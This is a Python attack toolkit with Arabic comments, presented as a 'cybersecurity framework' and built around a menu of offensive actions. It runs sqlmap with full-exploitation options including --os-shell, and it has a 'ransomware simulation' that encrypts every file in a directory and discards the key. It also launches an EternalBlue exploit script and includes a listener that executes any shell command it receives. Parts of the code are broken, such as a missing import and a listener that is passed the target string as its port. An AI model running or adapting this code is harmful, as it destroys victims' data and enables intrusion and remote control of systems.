import os
import socket
import subprocess
import requests
import logging
import random
import string
import json
import threading
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from nmap import PortScanner
import socks

# ========================
# إعدادات السجل
# ========================
LOG_FILE = 'advanced_cyber_tool_log.txt'
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# ========================
# وظائف المساعدة العامة
# ========================
def request_permission(tool_name, description):
    """
    طلب إذن المستخدم لتشغيل أداة معينة.
    """
    print(f"[INFO] {tool_name}: {description}")
    choice = input(f"[?] Do you want to proceed with {tool_name}? (y/n): ").strip().lower()
    return choice == 'y'

def is_ip_address(target):
    """
    التحقق إذا كان الهدف عنوان IP.
    """
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(ip_pattern, target))

def save_to_logfile(content, filename="tool_output.log"):
    """
    حفظ نتائج الأداة إلى ملف.
    """
    try:
        with open(filename, "a") as file:
            file.write(content + "\n")
        logging.info(f"Output saved to {filename}")
    except Exception as e:
        logging.error(f"Failed to save output to {filename}: {e}")

# ========================
# تحسينات على وظائف التشفير
# ========================
def generate_aes_key():
    """
    توليد مفتاح تشفير AES قوي.
    """
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    salt = os.urandom(32)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=32,
        salt=salt,
        iterations=500000
    )
    return kdf.derive(password.encode()), salt

def encrypt_file(filepath, key):
    """
    تشفير ملف باستخدام AES بمستوى عالي من الأمان.
    """
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        cipher = Cipher(algorithms.AES(key), modes.GCM(os.urandom(12)))
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(filepath, 'wb') as f:
            f.write(encrypted_data)
        logging.info(f"File encrypted: {filepath}")
    except Exception as e:
        logging.error(f"Error encrypting file {filepath}: {e}")

# ========================
# تحسينات على وظائف الهجمات
# ========================
def run_sqlmap(target):
    """
    تشغيل SQLMap مع إعدادات هجومية قوية واستغلال كامل للثغرات.
    """
    if not request_permission("SQLMap", "Execute advanced SQL Injection attacks?"):
        return
    try:
        command = [
            "sqlmap", "-u", f"{target}?id=1", "--batch", "--level=5", "--risk=3",
            "--tamper=space2comment,charencode,randomcase,between",
            "--random-agent", "--crawl=5", "--threads=10", "--technique=BEUSTQ",
            "--dump", "--forms", "--dbs", "--os-shell"
        ]
        subprocess.run(command)
    except Exception as e:
        logging.error(f"SQLMap execution failed: {e}")

def run_nmap(target):
    """
    تشغيل Nmap مع تحسين دقة الفحص واستخدام أساليب هجومية.
    """
    if not request_permission("Nmap", "Perform deep and comprehensive network scans?"):
        return
    try:
        if is_ip_address(target):
            subprocess.run(["nmap", "-A", "-T5", "--script", "vuln", "-p-", target])
            logging.info(f"Nmap scan completed for {target}")
        else:
            logging.warning("Nmap target must be an IP address.")
    except Exception as e:
        logging.error(f"Nmap scan failed: {e}")

def deploy_ransomware(target_directory):
    """
    محاكاة نشر برمجية فدية قوية.
    """
    if not request_permission("Ransomware", "Deploy ransomware?"):
        return
    try:
        logging.info("Deploying ransomware simulation...")
        key, _ = generate_aes_key()
        for root, _, files in os.walk(target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                encrypt_file(filepath, key)
        logging.info("Ransomware deployed successfully.")
    except Exception as e:
        logging.error(f"Ransomware deployment failed: {e}")

def exploit_smb(target_ip):
    """
    محاكاة استغلال SMB (مثل EternalBlue).
    """
    if not request_permission("SMB Exploit", "Execute SMB exploit?"):
        return
    try:
        logging.info(f"Simulating SMB exploit on {target_ip}...")
        command = ["python3", "eternalblue_exploit.py", target_ip]
        subprocess.run(command)
        logging.info("SMB exploit completed.")
    except Exception as e:
        logging.error(f"SMB exploit failed: {e}")

def setup_rat_listener(port):
    """
    إعداد مستمع RAT لاستقبال اتصالات العملاء.
    """
    try:
        logging.info(f"Starting RAT listener on port {port}...")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(("0.0.0.0", port))
        server.listen(5)
        logging.info("RAT listener running.")
        while True:
            client, addr = server.accept()
            logging.info(f"Connection from {addr}")
            threading.Thread(target=handle_rat_client, args=(client,)).start()
    except Exception as e:
        logging.error(f"RAT listener setup failed: {e}")

def handle_rat_client(client_socket):
    """
    إدارة العميل RAT.
    """
    try:
        while True:
            command = client_socket.recv(1024).decode()
            if command.lower() == "exit":
                client_socket.close()
                break
            output = subprocess.getoutput(command)
            client_socket.send(output.encode())
    except Exception as e:
        logging.error(f"Error handling RAT client: {e}")

# ========================
# الوظيفة الرئيسية
# ========================
def main():
    print("[INFO] Advanced Cybersecurity Framework Starting...")
    target = input("Enter target (IP or URL): ").strip()
    print("Select an action:")
    actions = {
        "1": ("Run SQLMap", run_sqlmap),
        "2": ("Run Nmap Scan", run_nmap),
        "3": ("Deploy Ransomware", deploy_ransomware),
        "4": ("Exploit SMB", exploit_smb),
        "5": ("Setup RAT Listener", setup_rat_listener),
    }
    for key, (desc, _) in actions.items():
        print(f"{key}) {desc}")

    choice = input("Choose an action: ").strip()
    if choice in actions:
        actions[choice][1](target)
    else:
        print("[ERROR] Invalid choice.")

if __name__ == "__main__":
    main()
